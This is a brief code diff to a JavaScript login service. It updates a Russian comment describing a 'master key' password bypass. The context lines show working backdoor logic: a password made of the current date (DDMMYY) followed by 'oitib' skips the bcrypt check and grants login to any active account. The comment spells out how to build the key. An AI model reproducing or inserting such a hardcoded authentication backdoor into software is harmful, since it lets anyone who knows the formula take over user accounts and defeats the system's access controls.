@@ -115,7 +115,7 @@ class LoginService {
         "Пользователь с таким login'ом не найден или отключен"
       );
     }
-    //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день
+    //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день, русский текст набирается в английской раскладке
     if (!(password === `${moment().format("DDMMYY")}oitib`)) {
       const isPassEquals = await bcrypt.compare(password, user.password);
       if (!isPassEquals) {
